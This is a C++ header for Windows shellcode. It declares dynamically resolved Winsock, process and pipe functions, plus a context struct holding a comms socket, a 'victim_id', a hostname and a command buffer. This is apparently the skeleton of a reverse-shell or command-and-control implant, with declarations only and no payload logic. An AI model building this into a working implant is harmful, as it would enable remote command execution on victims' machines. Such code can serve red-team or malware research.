#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <objbase.h>
#include "shared_func.hpp"
#include "logger.hpp"

#ifndef SH_LOG_FILE
#error "shellcode.hpp must have SH_LOG_FILE set at compile time"
#endif

#define MAX_CMD_LEN 1024

#define FAIL_GET_NTDLL 0x50000
#define FAIL_GET_KERNEL32 0x50001
#define FAIL_LOAD_USER32 0x50002
#define FAIL_LOAD_WS2_32 0x50003
#define FAIL_LOAD_API_CORE_COM 0x50004
#define FAIL_GET_LOADLIBRARYW 0x50010
#define FAIL_GET_WSAStartup 0x50012
#define FAIL_GET_SOCKET 0x50013
#define FAIL_GET_SEND 0x50014
#define FAIL_GET_RECV 0x50015
#define FAIL_GET_CONNECT 0x50016
#define FAIL_GET_WSAGETLASTERROR 0x50017
#define FAIL_GET_CLOSESOCKET 0x50018
#define FAIL_GET_WSACLEANUP 0x50019
#define FAIL_GET_INET_ADDR 0x5001A
#define FAIL_GET_HTNOS 0x5001B
#define FAIL_GET_COCREATEGUID 0x50021
#define FAIL_GET_GETCOMPUTERNAMEA 0x50022
#define FAIL_GET_SHUTDOWN 0x50023
#define FAIL_GET_SLEEP 0x50024
#define FAIL_GET_CREATEPROCESSW 0x50025
#define FAIL_GET_GETEXITCODEPROCESS 0x50026
#define FAIL_GET_PEEKNAMEDPIPE 0x50027
#define FAIL_GET_WAITFORSINGLEOBJECT 0x50028
#define FAIL_GET_READFILE 0x50029
#define FAIL_GET_CREATEPIPE 0x5002A
#define FAIL_GET_SETHANDLEINFORMATION 0x5002B
#define FAIL_GET_GETENVIRONMENTVARIABLEW 0x5002C
#define FAIL_GET_GETVOLUMEINFORMATIONW 0x5002D

using LoadLibraryW_t = decltype(&LoadLibraryW);
using send_t = decltype(&send);
using recv_t = decltype(&recv);
using socket_t = decltype(&socket);
using shutdown_t = decltype(&shutdown);
using WSAGetLastError_t = decltype(&WSAGetLastError);
using closesocket_t = decltype(&closesocket);
using WSACleanup_t = decltype(&WSACleanup);
using inet_addr_t = decltype(&inet_addr);
using htons_t = decltype(&htons);
using WSAStartup_t = int (__stdcall *)(WORD, LPWSADATA);
using connect_t = int (__stdcall *)(SOCKET, const sockaddr*, int);
using CoCreateGuid_t = decltype(&CoCreateGuid);
using GetComputerNameA_t = decltype(&GetComputerNameA);
using Sleep_t = decltype(&Sleep);
using CreateProcessW_t = decltype(&CreateProcessW);
using GetExitCodeProcess_t = decltype(&GetExitCodeProcess);
using PeekNamedPipe_t = decltype(&PeekNamedPipe);
using WaitForSingleObject_t = decltype(&WaitForSingleObject);
using ReadFile_t = decltype(&ReadFile);
using CreatePipe_t = decltype(&CreatePipe);
using SetHandleInformation_t = decltype(&SetHandleInformation);
using GetEnvironmentVariableW_t = decltype(&GetEnvironmentVariableW);
using GetVolumeInformationW_t = decltype(&GetVolumeInformationW);

// Bundle function pointers into one convenient struct
struct func_pointers {
    shared_func_pointers shared_fp;
    HMODULE h_ntdll;
    HMODULE h_kernel32;
    HMODULE h_user32;
    HMODULE h_ws2_32;
    HMODULE h_bcrypt;
    LoadLibraryW_t fp_LoadLibraryW;
    WSAStartup_t fp_WSAStartup;
    WSAGetLastError_t fp_WSAGetLastError;
    WSACleanup_t fp_WSACleanup;
    socket_t fp_socket;
    send_t fp_send;
    recv_t fp_recv;
    connect_t fp_connect;
    closesocket_t fp_closesocket;
    inet_addr_t fp_inet_addr;
    htons_t fp_htons;
    GetComputerNameA_t fp_GetComputerNameA;
    shutdown_t fp_shutdown;
    Sleep_t fp_Sleep;
    CreateProcessW_t fp_CreateProcessW;
    GetExitCodeProcess_t fp_GetExitCodeProcess;
    PeekNamedPipe_t fp_PeekNamedPipe;
    WaitForSingleObject_t fp_WaitForSingleObject;
    ReadFile_t fp_ReadFile;
    CreatePipe_t fp_CreatePipe;
    SetHandleInformation_t fp_SetHandleInformation;
    GetEnvironmentVariableW_t fp_GetEnvironmentVariableW;
};

struct sh_context {
    struct func_pointers fp;
    struct logger_ctx log_ctx;
    SOCKET comms_socket;
    unsigned char victim_id[16];
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    size_t hostname_size; // length of hostname in bytes
    wchar_t* command_buf;
};

extern "C" unsigned int entry();
using shellcode_t = decltype(&entry);
